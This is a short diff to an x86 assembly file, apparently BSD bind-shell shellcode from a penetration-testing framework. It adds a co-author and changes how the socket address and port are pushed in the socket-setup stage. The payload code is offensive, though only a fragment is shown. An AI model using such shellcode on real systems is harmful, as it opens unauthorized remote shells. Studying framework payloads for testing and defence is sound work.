@@ -4,6 +4,7 @@
 ;   Qualities: Can Have Nulls
 ;   Platforms: BSD
 ;     Authors: skape <mmiller [at] hick.org>
+;     Authors: vlad902 <vlad902 [at] gmail.com>
 ;     Version: $Revision$
 ;     License: 
 ;
@@ -26,8 +27,7 @@ socket:
 	pop  eax
 	cdq
 	push edx
-	push word 0xbfbf
-	o16 push byte 0x2
+	push dword 0xbfbf0210
 	mov  ecx, esp
 
 	push edx
@@ -37,6 +37,7 @@ socket:
 	push edx
 	push byte 0x10
 	int  0x80
+	cdq
 	xchg eax, ebx
 
 bind:
